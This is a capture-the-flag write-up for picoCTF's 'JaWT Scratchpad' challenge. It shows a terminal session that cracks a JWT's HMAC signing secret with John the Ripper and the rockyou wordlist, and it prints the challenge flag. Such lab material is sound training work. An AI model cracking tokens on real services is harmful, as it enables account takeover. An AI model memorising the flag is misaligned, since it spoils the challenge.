# JaWT Scratchpad

## Objetivo

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

## Hints

- What is that cookie?
- Have you heard of JWT?

## Solución

### Solución 1
```

┌──(kali㉿kali)-[~]
└─$ nano token
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamVzcyJ9.AzoHttJm6pXRPMIpkqHClBcQFTPsvIVNkyqfoKF5lqA
                                                                             
┌──(kali㉿kali)-[~]
└─$ john                                         
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
                                                                             
┌──(kali㉿kali)-[~]
└─$ john token                                   
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ls
amass      fasttrack.txt  legion      rockyou.txt  wifite.txt
dirb       fern-wifi      metasploit  sqlmap.txt
dirbuster  john.lst       nmap.lst    wfuzz
                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ 
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ head rockyou.txt                     
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                             
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ tail rockyou.txt
       1234567
       1
                  
            
           
▒xCvBnM,
ie168
abygurl69
a6_123
*7¡Vamos!

┌──(kali㉿kali)-[~]
└─$ john token -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:04 DONE (2023-03-14 11:19) 0.2272g/s 1681Kp/s 1681Kc/s 1681KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                             
┌──(kali㉿kali)-[~]
└─$ 

```

## Flag

picoCTF{jawt_was_just_what_you_thought_44c752f5}

## Notas adicionales

| Archivo | Descripción |
|------------|-------------|
| JSON|  Es un [formato de archivo](https://en.wikipedia.org/wiki/File_format "File format") [estándar](https://en.wikipedia.org/wiki/Help:IPA/English "Help:IPA/English") [abierto](https://en.wikipedia.org/wiki/Open_standard "estándar abierto") y un formato [de intercambio de datos](https://en.wikipedia.org/wiki/Electronic_data_interchange "Electronic data interchange") que utiliza texto [legible por humanos](https://en.wikipedia.org/wiki/Human-readable_medium "Human-readable medium") para almacenar y transmitir objetos de datos que consisten en [pares atributo-valor](https://en.wikipedia.org/wiki/Attribute%E2%80%93value_pair "Attribute–value pair") y [arreglos](https://en.wikipedia.org/wiki/Array_data_type "Array data type") (u otros valores [serializables ).](https://en.wikipedia.org/wiki/Serialization "Serialization") Es un formato de datos común con diversos usos en [el intercambio electrónico de datos](https://en.wikipedia.org/wiki/Electronic_data_interchange "Electronic data interchange") , incluido el de[](https://en.wikipedia.org/wiki/File_format "Formato de archivo")[](https://en.wikipedia.org/wiki/Electronic_data_interchange "Intercambio electrónico de datos")[](https://en.wikipedia.org/wiki/Human-readable_medium "medio legible por humanos")[](https://en.wikipedia.org/wiki/Attribute%E2%80%93value_pair "Par atributo-valor")[](https://en.wikipedia.org/wiki/Array_data_type "Tipo de datos de matriz")[](https://en.wikipedia.org/wiki/Serialization "Publicación por entregas")[](https://en.wikipedia.org/wiki/Electronic_data_interchange "Intercambio electrónico de datos")[aplicaciones web](https://en.wikipedia.org/wiki/Web_application "Aplicación web") con [servidores](https://en.wikipedia.org/wiki/Server_(computing) "Servidor (informática)") .  |
| JWT| JSON Web Token (JWT) es un estándar abierto ( [RFC 7519](https://tools.ietf.org/html/rfc7519) ) que define una forma compacta y autónoma de transmitir información de forma segura entre las partes como un objeto JSON. Esta información se puede verificar y confiar porque está firmada digitalmente. Los JWT se pueden firmar usando un secreto (con el algoritmo **HMAC** ) o un par de claves pública/privada usando **RSA** o **ECDSA** . |
|JOHN|Esta es la versión "jumbo" mejorada por la comunidad de John the Ripper. Tiene mucho código, documentación y datos aportados por desarrolladores jumbo y la comunidad de usuarios. Es fácil agregar código nuevo a jumbo y los requisitos de calidad son bajos, aunque últimamente hemos comenzado a someter todas las contribuciones a pruebas bastante automatizadas. Esto significa que obtiene una gran cantidad de funciones que no son necesariamente "maduras", lo que a su vez significa que se esperan errores en este código.|

Como tal la firma no se puede modificar. 

## Referencias

[JSON](https://en.wikipedia.org/wiki/JSON)
[JWT](https://jwt.io/introduction)
[JWT.io](https://jwt.io/#debugger-io)
[JOHN](https://github.com/openwall/john)
